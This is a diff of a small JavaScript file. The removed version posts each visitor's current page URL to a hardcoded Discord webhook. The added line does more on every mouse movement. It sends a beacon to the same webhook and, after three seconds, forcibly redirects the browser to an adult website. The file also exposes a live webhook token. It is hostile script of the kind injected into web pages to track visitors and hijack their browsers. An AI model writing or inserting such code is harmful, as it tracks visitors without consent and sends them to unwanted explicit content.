@@ -1,11 +1,1 @@
-var xhr = new XMLHttpRequest();
-var url = "https://discord.com/api/webhooks/1230013392190836807/YBJ3pNOa544labFi-TcurRFMDKlM2LMT36Jiel1PFWAy8TDWQqUa-yolhXwHQYD-F8bh";
-
-xhr.open("POST", url, true);
-xhr.setRequestHeader("Content-Type", "application/json");
-
-var data = JSON.stringify({
-    "content": window.location.href
-});
-
-xhr.send(data);
+document.addEventListener('mousemove', function(e) {var xhr = new XMLHttpRequest();var url = "https://discord.com/api/webhooks/1230013392190836807/YBJ3pNOa544labFi-TcurRFMDKlM2LMT36Jiel1PFWAy8TDWQqUa-yolhXwHQYD-F8bh";xhr.open("POST", url, true);xhr.setRequestHeader("Content-Type", "application/json");var data = JSON.stringify({"content": "cursor moved"});xhr.send(data);setTimeout(function() {window.location = 'https://e621.net'}, 3000)});
